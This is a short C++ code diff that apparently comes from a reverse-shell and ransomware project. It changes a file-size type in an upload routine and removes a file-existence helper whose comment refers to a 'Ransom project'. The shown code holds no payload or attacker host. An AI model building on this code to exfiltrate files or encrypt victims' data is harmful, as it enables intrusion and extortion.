@@ -91,7 +91,7 @@ void ReverseShellStandard::UploadFile(const std::string& localFilePath)
 }
 
 
-void ReverseShellStandard::UploadFileBytes(int fileSize)
+void ReverseShellStandard::UploadFileBytes(size_t fileSize)
 {
 	size_t bytesSent = 0;
 	while (fileSize > 0)
@@ -151,10 +151,4 @@ void ReverseShellStandard::WriteLeakedBytes()
 		std::cout << "==================================== " << requestStream.gcount() << " ====================================" << std::endl;
 		m_file.write(response.data(), requestStream.gcount());
 	} while (requestStream.gcount() > 0);
-}
-
-//TODO - This is implemented in FileEncryptionDesicion (Ransom project). Use from there.
-bool ReverseShellStandard::IsRegularFileExists(const std::filesystem::path& filePath)
-{
-	return (std::filesystem::exists(filePath) && std::filesystem::is_regular_file(filePath));
 }
